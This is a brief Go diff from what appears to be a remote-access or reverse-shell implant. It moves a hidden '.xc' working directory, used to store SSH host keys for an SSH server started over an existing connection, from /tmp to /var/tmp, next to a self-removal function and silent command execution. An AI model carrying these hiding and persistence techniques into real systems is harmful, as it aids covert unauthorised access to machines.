@@ -154,7 +154,7 @@ func Seppuku(c net.Conn) {
 
 // StartSSHServer ...
 func StartSSHServer(port int, c net.Conn) {
-	tmpDir := "/tmp/.xc"
+	tmpDir := "/var/tmp/.xc"
 	ExecSilent(fmt.Sprintf("mkdir -p %s", tmpDir), c)
 	hostRsaFile := fmt.Sprintf("%s/host_rsa", tmpDir)
 	hostDsaFile := fmt.Sprintf("%s/host_dsa", tmpDir)
